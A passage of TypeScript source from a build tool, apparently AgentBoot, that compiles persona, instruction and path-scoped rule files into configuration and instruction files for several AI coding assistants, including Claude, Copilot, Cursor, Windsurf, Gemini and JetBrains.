  const outputFormats = config.personas?.outputFormats ?? [...DEFAULT_OUTPUT_FORMATS];
  const platforms: string[] = [];

  // Write to dist/{platform}/{scopePath}/{persona}/ (or skills/{name}/ for claude)
  // e.g., dist/skill/core/code-reviewer/SKILL.md
  //        dist/claude/core/skills/review-code/SKILL.md

  if (outputFormats.includes("skill")) {
    const outDir = path.join(distPath, "skill", scopePath, personaName);
    ensureDir(outDir);
    const content = buildSkillOutput(personaName, personaConfig, composed, config, skillPath);
    fs.writeFileSync(path.join(outDir, "SKILL.md"), content, "utf-8");
    if (personaConfig) {
      fs.writeFileSync(
        path.join(outDir, "persona.config.json"),
        JSON.stringify(personaConfig, null, 2) + "\n",
        "utf-8"
      );
    }
    platforms.push("skill");
  }

  if (outputFormats.includes("claude")) {
    const { content, skillName } = buildClaudeOutput(personaName, personaConfig, composed, config);
    // CC-native: write to dist/claude/{scope}/skills/{skillName}/SKILL.md
    const skillDir = path.join(distPath, "claude", scopePath, "skills", skillName);
    ensureDir(skillDir);
    fs.writeFileSync(path.join(skillDir, "SKILL.md"), content, "utf-8");
    platforms.push("claude");
  }

  if (outputFormats.includes("claude")) {
    // AB-17: Write agent file to dist/claude/{scope}/agents/{personaName}.md
    const agentDir = path.join(distPath, "claude", scopePath, "agents");
    ensureDir(agentDir);

    const model = personaConfig?.model;  // undefined = omit from frontmatter
    const permMode = personaConfig?.permissionMode;
    const agentDescription = personaConfig?.description ?? personaName;
    // Escape for YAML double-quoted strings: backslashes, quotes, newlines, and --- sequences.
    const safeDescription = agentDescription
      .replace(/\\/g, "\\\\")   // backslashes first (before other escapes add more)
      .replace(/"/g, '\\"')     // double quotes
      .replace(/\n/g, " ")      // newlines → spaces
      .replace(/\t/g, " ")      // tabs → spaces
      .replace(/\0/g, "")       // null bytes → remove
      .replace(/[\x00-\x08\x0b\x0c\x0e-\x1f]/g, "") // other control chars → remove
      .replace(/---/g, "\\-\\-\\-"); // prevent YAML document markers
    const withoutFrontmatter = composed.replace(/^---\n[\s\S]*?\n---\n*/, "");
    const agentFrontmatter: string[] = [
      "---",
      `name: "${personaName}"`,
      `description: "${safeDescription}"`,
    ];
    if (model) agentFrontmatter.push(`model: "${model}"`);
    if (permMode && permMode !== "default") agentFrontmatter.push(`permissionMode: "${permMode}"`);
    // AB-161: Add pattern to agent frontmatter (omit "react" as it's the default)
    if (personaConfig?.pattern && personaConfig.pattern !== "react") {
      agentFrontmatter.push(`agentProfile: "${personaConfig.pattern}"`);
    }
    if (personaConfig?.maxTurns) {
      agentFrontmatter.push(`maxTurns: ${personaConfig.maxTurns}`);
    } else if (personaConfig?.pattern) {
      // AB-161: Use pattern's default maxTurns when persona doesn't specify one
      const patternConfig = PATTERN_CONFIGS[personaConfig.pattern];
      if (patternConfig?.maxTurns) agentFrontmatter.push(`maxTurns: ${patternConfig.maxTurns}`);
    }
    // Tool restrictions — CC enforces these at runtime
    if (personaConfig?.disallowedTools && personaConfig.disallowedTools.length > 0) {
      agentFrontmatter.push(`disallowedTools:`);
      for (const tool of personaConfig.disallowedTools) {
        agentFrontmatter.push(`  - "${tool}"`);
      }
    }
    if (personaConfig?.tools && personaConfig.tools.length > 0) {
      agentFrontmatter.push(`tools:`);
      for (const tool of personaConfig.tools) {
        agentFrontmatter.push(`  - "${tool}"`);
      }
    }
    agentFrontmatter.push("---");
    const agentContent = [...agentFrontmatter, "", withoutFrontmatter].join("\n");

    fs.writeFileSync(path.join(agentDir, `${personaName}.md`), agentContent, "utf-8");
  }

  if (outputFormats.includes("copilot")) {
    const outDir = path.join(distPath, "copilot", scopePath, personaName);
    ensureDir(outDir);
    const content = buildCopilotOutput(personaName, personaConfig, composed, config, skillPath);
    fs.writeFileSync(path.join(outDir, "copilot-instructions.md"), content, "utf-8");
    if (personaConfig) {
      fs.writeFileSync(
        path.join(outDir, "persona.config.json"),
        JSON.stringify(personaConfig, null, 2) + "\n",
        "utf-8"
      );
    }
    platforms.push("copilot");

    // AB-110: Copilot agent definitions (.github/agents/*.agent.md)
    const copilotAgentDir = path.join(distPath, "copilot", scopePath, "agents");
    ensureDir(copilotAgentDir);
    const agentContent = buildCopilotAgent(personaName, personaConfig, composed, config);
    fs.writeFileSync(path.join(copilotAgentDir, `${personaName}.agent.md`), agentContent, "utf-8");
  }

  if (outputFormats.includes("cursor")) {
    // AB-129: Cursor persona as a flat .mdc file with alwaysApply: true
    const cursorRulesDir = path.join(distPath, "cursor", scopePath, "rules");
    ensureDir(cursorRulesDir);
    const cursorContent = buildCursorRule(
      personaConfig?.description ?? personaName,
      composed,
      { alwaysApply: true }
    );
    fs.writeFileSync(path.join(cursorRulesDir, `${personaName}.mdc`), cursorContent, "utf-8");
    platforms.push("cursor");
  }

  // AB-146: Windsurf output — .windsurfrules flat text file
  if (outputFormats.includes("windsurf")) {
    const windsurfDir = path.join(distPath, "windsurf", scopePath);
    ensureDir(windsurfDir);
    const windsurfContent = buildWindsurfRules(personaName, personaConfig, composed, config);
    // Append each persona to a combined .windsurfrules file
    const rulesPath = path.join(windsurfDir, ".windsurfrules");
    const existing = fs.existsSync(rulesPath) ? fs.readFileSync(rulesPath, "utf-8") : "";
    const separator = existing ? "\n---\n\n" : "";
    fs.writeFileSync(rulesPath, `${existing}${separator}${windsurfContent}`, "utf-8");
    if (!platforms.includes("windsurf")) platforms.push("windsurf");
  }

  // AB-144: Gemini output — GEMINI.md + .gemini/ rules
  if (outputFormats.includes("gemini")) {
    const geminiDir = path.join(distPath, "gemini", scopePath, personaName);
    ensureDir(geminiDir);
    const geminiContent = buildGeminiOutput(personaName, personaConfig, composed, config);
    fs.writeFileSync(path.join(geminiDir, "persona.md"), geminiContent, "utf-8");
    if (!platforms.includes("gemini")) platforms.push("gemini");
  }

  // AB-158: JetBrains output — .junie/guidelines.md (concatenated personas)
  if (outputFormats.includes("jetbrains")) {
    const jetbrainsDir = path.join(distPath, "jetbrains", scopePath);
    ensureDir(jetbrainsDir);
    // Build content: strip frontmatter and HTML comments for clean markdown
    const cleanContent = composed
      .replace(/^---\n[\s\S]*?\n---\n*/, "")
      .replace(/<!--[\s\S]*?-->/g, "")
      .trim();
    const personaHeader = `## ${personaConfig?.name ?? personaName}\n\n`;
    const description = personaConfig?.description ? `> ${personaConfig.description}\n\n` : "";
    const junieContent = `${personaHeader}${description}${cleanContent}\n`;

    // Append to concatenated .junie/AGENTS.md (Phase 11 A1f: upgraded from guidelines.md)
    const junieDir = path.join(jetbrainsDir, ".junie");
    ensureDir(junieDir);
    const agentsMdPath = path.join(junieDir, "AGENTS.md");
    const existing = fs.existsSync(agentsMdPath) ? fs.readFileSync(agentsMdPath, "utf-8") : "";
    const separator = existing ? "\n---\n\n" : `<!-- AgentBoot compiled output — do not edit manually -->\n\n# AgentBoot Personas\n\n`;
    fs.writeFileSync(agentsMdPath, `${existing}${separator}${junieContent}`, "utf-8");

    if (!platforms.includes("jetbrains")) platforms.push("jetbrains");
  }

  return { persona: personaName, platforms, traitsInjected: injected, scope };
}

// ---------------------------------------------------------------------------
// Always-on instructions compilation — writes to each platform
// ---------------------------------------------------------------------------

function compileInstructions(
  instructionsDir: string,
  enabledInstructions: string[] | undefined,
  distPath: string,
  scopePath: string,
  config: AgentBootConfig,
  outputFormats: string[],
  /** F-6: out-param collecting every enabled instruction's path scope, keyed
   *  `<scope>/<name>` so the hub copy legitimately overwrites the package copy. */
  scopeSeen?: Map<string, ScopedArtifact>,
): void {
  if (!fs.existsSync(instructionsDir)) {
    return;
  }

  const files = fs.readdirSync(instructionsDir).filter((f) => f.endsWith(".md"));
  const provenanceEnabled = config.output?.provenanceHeaders !== false;

  // Collected BEFORE the platform loop, and independently of it: the loop skips
  // agents/plugin/gemini/codex, so a build targeting only the unsupported tier
  // would otherwise leave the gate blind on exactly the case it exists for.
  if (scopeSeen) {
    for (const file of files) {
      const name = path.basename(file, ".md");
      if (enabledInstructions && !enabledInstructions.includes(name)) continue;
      const srcPath = path.join(instructionsDir, file);
      const sc = inspectScope(fs.readFileSync(srcPath, "utf-8"));
      scopeSeen.set(`${scopePath}/${name}`, {
        name, file: srcPath, scopePath: sc.raw ?? "", globs: sc.globs,
        acknowledgedUnscoped: sc.acknowledgedUnscoped,
      });
    }
  }

  for (const platform of outputFormats) {
    if (platform === "agents" || platform === "plugin" || platform === "gemini" || platform === "codex") continue; // handled separately; gemini/codex inline instructions in their primary config file

    for (const file of files) {
      const name = path.basename(file, ".md");
      if (enabledInstructions && !enabledInstructions.includes(name)) {
        continue;
      }
      const srcPath = path.join(instructionsDir, file);
      let content = fs.readFileSync(srcPath, "utf-8");

      // Phase 11 B2: Cursor instructions — use .mdc format with alwaysApply
      if (platform === "cursor") {
        const strippedContent = content.replace(/^---\n[\s\S]*?\n---\n*/, "").trim();
        // F-6: `alwaysApply: true` was HARDCODED here, so `applyTo: "src/api/**"`
        // shipped as always-on, every file — the opposite of what was authored.
        // buildCursorRule already accepted { globs, alwaysApply }; only the
        // caller was missing. `alwaysApply: globs.length === 0` preserves the
        // mutual-exclusivity invariant (globs XOR alwaysApply) asserted in
        // tests/pipeline.test.ts.
        const { globs } = inspectScope(content);
        const cursorContent = buildCursorRule(name, strippedContent, {
          globs: globs.length > 0 ? globs : undefined,
          alwaysApply: globs.length === 0,
        });
        const outDir = path.join(distPath, platform, scopePath, "rules");
        ensureDir(outDir);
        fs.writeFileSync(path.join(outDir, `${name}.mdc`), cursorContent, "utf-8");
        continue;
      }

      // Phase 11 A1e: Windsurf instructions — write to .windsurf/rules/ with trigger: always_on
      // Also append to legacy .windsurfrules for backward compat
      if (platform === "windsurf") {
        const strippedContent = content.replace(/^---\n[\s\S]*?\n---\n*/, "").replace(/<!--[\s\S]*?-->/g, "").trim();
        // Modern format: .windsurf/rules/*.md with trigger frontmatter
        const windsurfRulesDir = path.join(distPath, "windsurf", scopePath, ".windsurf", "rules");
        ensureDir(windsurfRulesDir);
        // F-6: `trigger: always_on` was a hardcoded string literal. Same shape
        // compileGotchas already emits for this platform, ten lines away.
        const { globs } = inspectScope(content);
        const windsurfLines = ["---", `trigger: ${globs.length > 0 ? "glob" : "always_on"}`];
        if (globs.length > 0) {
          windsurfLines.push("globs:");
          for (const g of globs) windsurfLines.push(`  - "${g}"`);
        }
        windsurfLines.push(`description: "${name}"`, "---", "", strippedContent, "");
        fs.writeFileSync(path.join(windsurfRulesDir, `${name}.md`), windsurfLines.join("\n"), "utf-8");
        // Legacy format: append to .windsurfrules. This file has no frontmatter
        // and no scoping mechanism — a degraded channel of a translated
        // platform — so the scope rides as prose. Dropping the block instead
        // would be the same content-loss failure in the other direction.
        const windsurfDir = path.join(distPath, "windsurf", scopePath);
        ensureDir(windsurfDir);
        const rulesPath = path.join(windsurfDir, ".windsurfrules");
        const existing = fs.existsSync(rulesPath) ? fs.readFileSync(rulesPath, "utf-8") : "";
        const separator = existing ? "\n---\n\n" : "";
        const legacyBody = globs.length > 0
          ? `${scopePreamble(globs)}\n${strippedContent}`
          : strippedContent;
        fs.writeFileSync(rulesPath, `${existing}${separator}${legacyBody}\n`, "utf-8");
        continue;
      }

      // CC and other platforms: write instructions to appropriate directory
      const dirName = platform === "claude" ? "rules"
        : platform === "jetbrains" ? ".aiassistant/rules"
        : "instructions";
      const outDir = path.join(distPath, platform, scopePath, dirName);
      ensureDir(outDir);

      // Strip HTML comments for copilot output
      if (platform === "copilot") {
        content = content.replace(/<!--[\s\S]*?-->/g, "").trim() + "\n";
      }

      let finalContent: string;
      if (!provenanceEnabled) {
        finalContent = content;
      } else {
        // Frontmatter-first formats (CC rules, SKILL.md, Cursor .mdc, Copilot
        // .instructions.md) must open with the YAML delimiter — withProvenance
        // places the header after the frontmatter when present.
        finalContent = withProvenance(content, srcPath, config);
      }

      // F-6: project the path scope onto this platform.
      const scope = inspectScope(content);
      if (platform === "jetbrains" && APPLY_TO_PROJECTION["jetbrains"]?.support === "translated") {
        // JetBrains reads `globs:`, not `applyTo:` — the key was written
        // verbatim and was therefore inert. Rewrite the ONE line in place;
        // regenerating the frontmatter would destroy the id/slug/hash identity
        // stamp (decision-0005) that artifact-identity.test.ts asserts.
        finalContent = scope.globs.length > 0
          ? finalContent.replace(/^\s*applyTo:.*$/im, `globs: ${JSON.stringify(scope.globs)}`)
          // No globs → always-on. JetBrains treats a rule with no `globs:` as
          // always-on, matching what compileGotchas emits.
          : finalContent.replace(/^\s*applyTo:.*\n/im, "");
      } else if (
        scope.globs.length > 0 &&
        (APPLY_TO_PROJECTION[platform]?.support ?? "unsupported") === "unsupported"
      ) {
        // This target has no scoping mechanism at all. Say so IN the artifact:
        // that converts a silent unscoped injection into an explicitly
        // conditional instruction, and is why acknowledging the gap is a
        // decision rather than a rubber stamp.
        finalContent = insertAfterFrontmatter(finalContent, scopePreamble(scope.globs));
      }
      fs.writeFileSync(path.join(outDir, file), finalContent, "utf-8");
    }
  }
}

// ---------------------------------------------------------------------------
// AB-52: Gotchas compilation — path-scoped knowledge rules
// ---------------------------------------------------------------------------

function compileGotchas(
  gotchasDir: string,
  distPath: string,
  scopePath: string,
  config: AgentBootConfig,
  outputFormats: string[]
): void {
  if (!fs.existsSync(gotchasDir)) {
    return;
  }

  const gotchaFiles = fs.readdirSync(gotchasDir).filter(
    (f) => f.endsWith(".md") && f !== "README.md"
  );

  if (gotchaFiles.length === 0) return;

  log(chalk.gray(`  Gotchas: ${gotchaFiles.length} rule(s)`));

  for (const file of gotchaFiles) {
    const content = fs.readFileSync(path.join(gotchasDir, file), "utf-8");
    // Gotchas carry paths: frontmatter — the provenance comment must land AFTER
    // it (frontmatter-first formats; a comment before --- defeats path scoping).
    const withHeader = withProvenance(content, path.join(gotchasDir, file), config);

    // Write to claude rules (gotchas are path-scoped rules)
    if (outputFormats.includes("claude")) {
      const rulesDir = path.join(distPath, "claude", scopePath, "rules");
      ensureDir(rulesDir);
      fs.writeFileSync(path.join(rulesDir, file), withHeader, "utf-8");
    }

    // Write to skill output as well
    if (outputFormats.includes("skill")) {
      const gotchaOutDir = path.join(distPath, "skill", scopePath, "gotchas");
      ensureDir(gotchaOutDir);
      fs.writeFileSync(path.join(gotchaOutDir, file), withHeader, "utf-8");
    }

    // AB-129: Cursor output — gotchas become glob-scoped .mdc rules
    if (outputFormats.includes("cursor")) {
      const fm = parseFrontmatter(content);
      const rawPaths = fm?.get("paths");
      // Strip surrounding quotes from YAML values (parseFrontmatter preserves them)
      const pathsStr = rawPaths?.replace(/^["']|["']$/g, "");
      const globs = pathsStr ? pathsStr.split(",").map(p => p.trim()).filter(Boolean) : undefined;
      const name = path.basename(file, ".md");
      const cursorRulesDir = path.join(distPath, "cursor", scopePath, "rules");
      ensureDir(cursorRulesDir);
      const cursorDesc = (fm?.get("description") ?? name).replace(/^["']|["']$/g, "");
      const cursorContent = buildCursorRule(
        cursorDesc,
        content.replace(/^---\n[\s\S]*?\n---\n*/, ""), // strip frontmatter
        { globs, alwaysApply: false }
      );
      fs.writeFileSync(path.join(cursorRulesDir, `${name}.mdc`), cursorContent, "utf-8");
    }

    // AB-146 + Phase 11 A1e: Windsurf gotchas — .windsurf/rules/*.md (modern) + legacy .windsurfrules
    if (outputFormats.includes("windsurf")) {
      const fm = parseFrontmatter(content);
      const rawPaths = fm?.get("paths");
      const pathsStr = rawPaths?.replace(/^["']|["']$/g, "");
      const globs = pathsStr ? pathsStr.split(",").map(p => p.trim()).filter(Boolean) : undefined;
      const gotchaName = path.basename(file, ".md");
      const gotchaContent = content.replace(/^---\n[\s\S]*?\n---\n*/, "").replace(/<!--[\s\S]*?-->/g, "").trim();

      // Modern format: .windsurf/rules/*.md with trigger frontmatter
      const windsurfRulesDir = path.join(distPath, "windsurf", scopePath, ".windsurf", "rules");
      ensureDir(windsurfRulesDir);
      const triggerType = globs ? "glob" : "always_on";
      const windsurfModernLines = ["---", `trigger: ${triggerType}`];
      if (globs && globs.length > 0) {
        windsurfModernLines.push("globs:");
        for (const g of globs) windsurfModernLines.push(`  - "${g}"`);
      }
      windsurfModernLines.push(`description: "${gotchaName}"`, "---", "", gotchaContent, "");
      fs.writeFileSync(path.join(windsurfRulesDir, `gotcha-${gotchaName}.md`), windsurfModernLines.join("\n"), "utf-8");

      // Legacy format: append to .windsurfrules
      const windsurfDir = path.join(distPath, "windsurf", scopePath);
      ensureDir(windsurfDir);
      const rulesPath = path.join(windsurfDir, ".windsurfrules");
      const existing = fs.existsSync(rulesPath) ? fs.readFileSync(rulesPath, "utf-8") : "";
      const separator = existing ? "\n---\n\n" : "";
      fs.writeFileSync(rulesPath, `${existing}${separator}${gotchaContent}\n`, "utf-8");
    }

    // Phase 11 A1c: Gemini gotchas — subdirectory GEMINI.md (NOT .gemini/rules/)
    if (outputFormats.includes("gemini")) {
      const fm = parseFrontmatter(content);
      const rawPaths = fm?.get("paths");
      const pathsStr = rawPaths?.replace(/^["']|["']$/g, "");
      const geminiContent = content.replace(/^---\n[\s\S]*?\n---\n*/, "").replace(/<!--[\s\S]*?-->/g, "").trim();

      if (pathsStr) {
        // Extract directory component from path patterns
        const patterns = pathsStr.split(",").map(p => p.trim()).filter(Boolean);
        let targetDir: string | null = null;
        for (const pattern of patterns) {
          // Extract directory: "src/auth/**" → "src/auth", "**/*.lambda.ts" → null (wildcard-only)
          const dirMatch = pattern.match(/^([^*]+)\//);
          if (dirMatch && dirMatch[1]) {
            targetDir = dirMatch[1];
            break;
          }
        }
        if (targetDir) {
          // Directory-scoped: write GEMINI.md in the target directory
          const geminiSubDir = path.join(distPath, "gemini", scopePath, targetDir);
          ensureDir(geminiSubDir);
          const geminiSubPath = path.join(geminiSubDir, "GEMINI.md");
          const existingGemini = fs.existsSync(geminiSubPath) ? fs.readFileSync(geminiSubPath, "utf-8") : "";
          const geminiSeparator = existingGemini ? "\n\n---\n\n" : "";
          fs.writeFileSync(geminiSubPath, `${existingGemini}${geminiSeparator}${geminiContent}\n`, "utf-8");
        } else {
          // Wildcard-only patterns: merge into root GEMINI.md
          const geminiRoot = path.join(distPath, "gemini", scopePath, "GEMINI.md");
          const existingRoot = fs.existsSync(geminiRoot) ? fs.readFileSync(geminiRoot, "utf-8") : "";
          const rootSeparator = existingRoot ? "\n\n---\n\n" : "";
          fs.writeFileSync(geminiRoot, `${existingRoot}${rootSeparator}${geminiContent}\n`, "utf-8");
        }
      } else {
        // No paths: always-on, merge into root GEMINI.md
        const geminiRoot = path.join(distPath, "gemini", scopePath, "GEMINI.md");
        const existingRoot = fs.existsSync(geminiRoot) ? fs.readFileSync(geminiRoot, "utf-8") : "";
        const rootSeparator = existingRoot ? "\n\n---\n\n" : "";
        fs.writeFileSync(geminiRoot, `${existingRoot}${rootSeparator}${geminiContent}\n`, "utf-8");
      }
    }

    // AB-130: Copilot scoped instructions — gotchas with paths: become .instructions.md
    if (outputFormats.includes("copilot")) {
      const fm = parseFrontmatter(content);
      const rawPaths = fm?.get("paths");
      // Strip surrounding quotes from YAML values (parseFrontmatter preserves them)
      const pathsStr = rawPaths?.replace(/^["']|["']$/g, "");
      if (pathsStr) {
        const name = path.basename(file, ".md");
        const description = (fm?.get("description") ?? name).replace(/^["']|["']$/g, "");
        const copilotInstrDir = path.join(distPath, "copilot", scopePath, "instructions");
        ensureDir(copilotInstrDir);
        const strippedContent = content.replace(/^---\n[\s\S]*?\n---\n*/, "").trim();
        const copilotInstrContent = [
          "---",
          `description: "${description}"`,
          `applyTo: "${pathsStr}"`,
          "---",
          "",
          strippedContent,
          "",
        ].join("\n");
        fs.writeFileSync(path.join(copilotInstrDir, `${name}.instructions.md`), copilotInstrContent, "utf-8");
      }
    }

    // AB-158: JetBrains AI Assistant gotchas — .aiassistant/rules/ with globs: frontmatter
    if (outputFormats.includes("jetbrains")) {
      const fm = parseFrontmatter(content);
      const rawPaths = fm?.get("paths");
      const pathsStr = rawPaths?.replace(/^["']|["']$/g, "");
      const name = path.basename(file, ".md");
      const description = (fm?.get("description") ?? name).replace(/^["']|["']$/g, "");
      const jetbrainsRulesDir = path.join(distPath, "jetbrains", scopePath, ".aiassistant", "rules");
      ensureDir(jetbrainsRulesDir);
      const strippedContent = content.replace(/^---\n[\s\S]*?\n---\n*/, "").trim();

      const frontmatterLines = ["---"];
      if (pathsStr) {
        const globs = pathsStr.split(",").map(p => p.trim()).filter(Boolean);
        frontmatterLines.push(`globs: ${JSON.stringify(globs)}`);
      }
      frontmatterLines.push(`description: "${description}"`);
      frontmatterLines.push("---");

      const jetbrainsContent = [...frontmatterLines, "", strippedContent, ""].join("\n");
      fs.writeFileSync(path.join(jetbrainsRulesDir, `${name}.rules.md`), jetbrainsContent, "utf-8");
    }
  }
}

// ---------------------------------------------------------------------------
// PERSONAS.md index generation — writes to each platform
// ---------------------------------------------------------------------------

function generatePersonasIndex(
  results: CompileResult[],
  config: AgentBootConfig,
  personasBaseDir: string,
  distPath: string,
  scopePath: string,
  outputFormats: string[]
): void {
  const org = config.orgDisplayName ?? config.org;
  const lines: string[] = [
    `<!-- AgentBoot generated — do not edit manually. Org: ${org} -->`,
    "",
    `# Available Personas`,
    "",
    `> Generated by AgentBoot for **${org}**. Run \`npm run build\` to refresh.`,
    "",
    "| Persona | Invocation | Description |",
    "|---|---|---|",
  ];

  for (const result of results.filter((r) => r.platforms.length > 0)) {
    const personaConfigPath = path.join(personasBaseDir, result.persona, "persona.config.json");
    let invocation = `/${result.persona}`;
    let description = "";

    if (fs.existsSync(personaConfigPath)) {
      try {
        const pc = JSON.parse(fs.readFileSync(personaConfigPath, "utf-8")) as PersonaConfig;
        invocation = pc.invocation ?? invocation;
        description = pc.description ?? "";
      } catch {
        // ignore
      }
    }

    lines.push(`| **${result.persona}** | \`${invocation}\` | ${description} |`);
  }

  const content = lines.join("\n") + "\n";

  for (const platform of outputFormats) {
    const outDir = path.join(distPath, platform, scopePath);
    ensureDir(outDir);
    fs.writeFileSync(path.join(outDir, "PERSONAS.md"), content, "utf-8");
  }
}

// ---------------------------------------------------------------------------
// AB-19: CLAUDE.md with @import directives + trait files
// ---------------------------------------------------------------------------

function generateClaudeMd(
  traitNames: string[],
  traits: Map<string, TraitContent>,
  instructionFileNames: string[],
  config: AgentBootConfig,
  distPath: string,
  scopePath: string,
  personaConfigs?: Map<string, PersonaConfig>,
  lexiconEntries?: LexiconEntry[]
): void {
  const org = config.orgDisplayName ?? config.org;

  // Write trait files to dist/claude/{scopePath}/traits/
  const traitsDir = path.join(distPath, "claude", scopePath, "traits");
  ensureDir(traitsDir);

  for (const traitName of traitNames) {
    const trait = traits.get(traitName);
    if (trait) {
      fs.writeFileSync(path.join(traitsDir, `${traitName}.md`), trait.raw, "utf-8");
    }
  }

  // Build CLAUDE.md with @import directives
  const lines: string[] = [
    `# AgentBoot — ${org}`,
    "",
    "<!-- Auto-generated. Do not edit manually. -->",
    "",
  ];

  // Lexicon first — context compression primitives that all other sections reference
  if (lexiconEntries && lexiconEntries.length > 0) {
    lines.push(compileLexiconBlock(lexiconEntries));
  }

  if (traitNames.length > 0) {
    lines.push("## Traits", "");
    for (const traitName of traitNames) {
      if (traits.has(traitName)) {
        lines.push(`@.claude/traits/${traitName}.md`);
      }
    }
    lines.push("");
  }

  if (instructionFileNames.length > 0) {
    lines.push("## Instructions", "");
    for (const instrName of instructionFileNames) {
      lines.push(`@.claude/rules/${instrName}.md`);
    }
    lines.push("");
  }

  // AB-77: First-session welcome fragment
  if (personaConfigs && personaConfigs.size > 0) {
    lines.push("## Available Personas", "");
    for (const [, pc] of personaConfigs) {
      const cmd = pc.invocation ?? `/${pc.name}`;
      lines.push(`- \`${cmd}\` — ${pc.description}`);
    }
    lines.push("");
  }

  const claudeMdPath = path.join(distPath, "claude", scopePath, "CLAUDE.md");
  fs.writeFileSync(claudeMdPath, lines.join("\n"), "utf-8");
}

// ---------------------------------------------------------------------------
// AB-144: GEMINI.md generation — Gemini CLI project instructions
// ---------------------------------------------------------------------------

function generateGeminiMd(
  traitNames: string[],
  traits: Map<string, TraitContent>,
  instructionFileNames: string[],
  config: AgentBootConfig,
  distPath: string,
  scopePath: string,
  personaConfigs?: Map<string, PersonaConfig>,
  lexiconEntries?: LexiconEntry[]
): void {
  const org = config.orgDisplayName ?? config.org;

  const lines: string[] = [
    `# ${org} — Agent Configuration`,
    "",
    "<!-- Auto-generated by AgentBoot. Do not edit manually. -->",
    "",
  ];

  // Lexicon
  if (lexiconEntries && lexiconEntries.length > 0) {
    lines.push(compileLexiconBlock(lexiconEntries));
  }

  // Instructions (inline content for Gemini since it doesn't support @imports)
  // Look in the hub's instructions first, then the package bundle as fallback.
  // Hub files win on name conflict.
  if (instructionFileNames.length > 0) {
    lines.push("## Instructions", "");
    const hubInstructionsDir = path.join(HUB_ROOT, "core", "instructions");
    const packageInstructionsDir = path.join(ROOT, "core", "instructions");
    for (const instrName of instructionFileNames) {
      const candidatePaths = [
        path.join(hubInstructionsDir, `${instrName}.md`),
        path.join(packageInstructionsDir, `${instrName}.md`),
      ];
      const instrPath = candidatePaths.find((p) => fs.existsSync(p));
      if (instrPath) {
        const raw = fs.readFileSync(instrPath, "utf-8");
        const content = raw
          .replace(/^---\n[\s\S]*?\n---\n*/, "")
          .replace(/<!--[\s\S]*?-->/g, "")
          .trim();
        // F-6: GEMINI.md is always-on, so a narrow scope is lost here. Carry it
        // as prose rather than injecting the rule as if it were global.
        const gScope = inspectScope(raw);
        if (gScope.globs.length > 0) lines.push(scopePreamble(gScope.globs), "");
        lines.push(content, "");
      }
    }
  }

  // Traits (inline)
  if (traitNames.length > 0) {
    lines.push("## Behavioral Traits", "");
    for (const traitName of traitNames) {
      const trait = traits.get(traitName);
      if (trait) {
        const content = trait.content.replace(/<!--[\s\S]*?-->/g, "").trim();
        lines.push(content, "");
      }
    }
  }

  // Persona index
  if (personaConfigs && personaConfigs.size > 0) {
    lines.push("## Available Personas", "");
    for (const [, pc] of personaConfigs) {
      const cmd = pc.invocation ?? `/${pc.name}`;
      lines.push(`- \`${cmd}\` — ${pc.description}`);
    }
    lines.push("");
  }

  const geminiMdPath = path.join(distPath, "gemini", scopePath, "GEMINI.md");
  ensureDir(path.dirname(geminiMdPath));
  fs.writeFileSync(geminiMdPath, lines.join("\n"), "utf-8");
}

// ---------------------------------------------------------------------------
// AGENTS.md generation — universal cross-tool standard
// ---------------------------------------------------------------------------

function generateAgentsMd(
  config: AgentBootConfig,
  distPath: string,
  personaConfigs: Map<string, PersonaConfig>,
  instructionFileNames: string[],
  lexiconEntries: LexiconEntry[],
  instructionsDir: string,
  packageInstructionsDir?: string,
  traitsMap?: Map<string, TraitContent>,
  gotchasDir?: string,
  scopePath?: string,
  targetPlatform?: string,
): void {
  const org = config.orgDisplayName ?? config.org;
  const scopeLabel = scopePath ? ` (${scopePath})` : "";
  const lines: string[] = [
    `# ${org}${scopeLabel} — Agent Configuration`,
    "",
    `> Generated by [AgentBoot](https://agentboot.dev). Do not edit manually.`,
    "",
  ];

  // Lexicon section
  if (lexiconEntries.length > 0) {
    lines.push("## Terminology", "");
    for (const entry of lexiconEntries) {
      let line = `- **${entry.term}**: ${entry.definition}`;
      if (entry.extras) {
        const extraParts = Object.entries(entry.extras).map(([k, v]) => `${k}: ${v}`).join("; ");
        line += ` (${extraParts})`;
      }
      lines.push(line);
    }
    lines.push("");
  }

  // Phase 11 B4: Full instruction content inlining (was one-line summaries)
  // Phase 11 A1a: candidatePaths fallback — try hub first, then package-bundled
  if (instructionFileNames.length > 0) {
    lines.push("## Coding Conventions", "");
    for (const instrName of instructionFileNames) {
      // A1a: Try hub instructionsDir first, fall back to packageInstructionsDir
      const hubPath = path.join(instructionsDir, `${instrName}.md`);
      const pkgPath = packageInstructionsDir ? path.join(packageInstructionsDir, `${instrName}.md`) : null;
      const instrPath = fs.existsSync(hubPath) ? hubPath : (pkgPath && fs.existsSync(pkgPath) ? pkgPath : null);

      if (instrPath) {
        const content = fs.readFileSync(instrPath, "utf-8");
        const contentWithoutFrontmatter = content.replace(/^---\n[\s\S]*?\n---\n*/, "").trim();
        // B4: Inline full content instead of just first line
        lines.push(`### ${instrName}`, "");
        // F-6: AGENTS.md is always-on (feeds both `agents` and `codex`), so a
        // narrow applyTo cannot be expressed — say so instead of shipping the
        // rule as though it were global.
        const aScope = inspectScope(content);
        if (aScope.globs.length > 0) lines.push(scopePreamble(aScope.globs), "");
        lines.push(contentWithoutFrontmatter);
        lines.push("");
      }
    }
  }

  // Phase 11 B4: Traits section
  if (traitsMap && traitsMap.size > 0) {
    const enabledTraits = config.traits?.enabled ?? [];
    const relevantTraits = enabledTraits.filter(t => traitsMap.has(t));
    if (relevantTraits.length > 0) {
      lines.push("## Behavioral Traits", "");
      for (const traitName of relevantTraits) {
        const trait = traitsMap.get(traitName)!;
        lines.push(`### ${traitName}`, "");
        // Include trait content (strip frontmatter, keep concise)
        const traitContent = trait.content.replace(/^---\n[\s\S]*?\n---\n*/, "").trim();
        // Limit to first ~50 lines to prevent oversized AGENTS.md
        const traitLines = traitContent.split("\n").slice(0, 50);
        lines.push(traitLines.join("\n"));
        if (traitContent.split("\n").length > 50) {
          lines.push("", "*(truncated for brevity)*");
        }
        lines.push("");
      }
    }
  }

  // Phase 11 B4: Path-scoped rules (gotchas) section
  if (gotchasDir && fs.existsSync(gotchasDir)) {
    const gotchaFiles = fs.readdirSync(gotchasDir).filter(f => f.endsWith(".md") && f !== "README.md");
    if (gotchaFiles.length > 0) {
      lines.push("## Path-Scoped Rules", "");
      for (const gFile of gotchaFiles) {
        const gContent = fs.readFileSync(path.join(gotchasDir, gFile), "utf-8");
        const fm = parseFrontmatter(gContent);
        const rawPaths = fm?.get("paths");
        const pathsStr = rawPaths?.replace(/^["']|["']$/g, "");
        const gName = path.basename(gFile, ".md");
